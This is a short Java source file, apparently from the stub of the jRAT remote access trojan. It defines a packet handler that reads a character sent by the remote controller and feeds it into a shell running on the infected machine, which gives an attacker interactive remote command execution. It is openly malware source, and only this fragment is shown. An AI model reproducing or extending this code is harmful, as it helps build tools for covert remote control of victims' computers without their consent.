package se.jrat.stub.packets.incoming;

import java.io.PrintWriter;

import se.jrat.stub.Connection;
import se.jrat.stub.RemoteShell;

public class Packet22RemoteShellTyped extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		char c = con.getDataInputStream().readChar();

		PrintWriter input = new PrintWriter(RemoteShell.getInstance().getOutputStream(), true);
		input.print(c);
		input.flush();
	}

}
